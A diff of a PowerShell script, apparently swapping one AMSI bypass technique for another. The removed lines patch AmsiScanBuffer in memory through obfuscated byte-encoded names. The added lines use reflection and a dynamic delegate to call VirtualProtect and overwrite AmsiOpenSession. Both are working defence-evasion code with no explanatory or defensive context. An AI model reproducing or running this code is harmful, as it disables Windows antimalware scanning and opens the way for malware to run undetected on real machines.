@@ -1,24 +1,43 @@
-$c = ‘t’
-$Win32 = @”
-using System.Runtime.InteropServices;
-using System;
-public class Win32 {
-[DllImport(“kernel32”)]
-public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-[DllImport(“kernel32”)]
-public static extern IntPtr LoadLibrary(string name);
-[DllImport(“kernel32”)]
-public static extern bool VirtualProtec$c(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+function LookupFunc {
+    Param ($moduleName, $functionName)
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+     Equals('System.dll')
+     }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -like "Ge*P*oc*ddress") {$tmp+=$_}}
+    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
+@($moduleName)), $functionName))
 }
-“@
-Add-Type $Win32
-$nowhere = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
-$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($nowhere))
-$somewhere = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
-$notaddress = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($somewhere))
-$notp = 0
-$replace = ‘VirtualProtec’
-[Win32]::(‘{0}{1}’ -f $replace,$c)($notaddress, [uint32]5, 0x40, [ref]$notp)
-$stopitplease = [Byte[]] (0xB8, 0x57, 0x00, 0x17, 0x20, 0x35, 0x8A, 0x53, 0x34, 0x1D, 0x05, 0x7A, 0xAC, 0xE3, 0x42, 0xC3)
-$marshalClass = [System.Runtime.InteropServices.Marshal]
-$marshalClass::Copy($stopitplease, 0, $notaddress, $stopitplease.Length)
+
+
+function getDelegateType {
+    Param (
+     [Parameter(Position = 0, Mandatory = $True)] [Type[]]
+     $func, [Parameter(Position = 1)] [Type] $delType = [Void]
+    )
+    $type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
+[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+    DefineDynamicModule('InMemoryModule', $false).
+    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,
+    AutoClass', [System.MulticastDelegate])
+
+  $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public',
+[System.Reflection.CallingConventions]::Standard, $func).
+     SetImplementationFlags('Runtime, Managed')
+
+  $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,
+$func). SetImplementationFlags('Runtime, Managed')
+    return $type.CreateType()
+}
+
+
+[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
+$oldProtectionBuffer = 0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
+$buf = [Byte[]] (0x48,0x31,0xc9)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
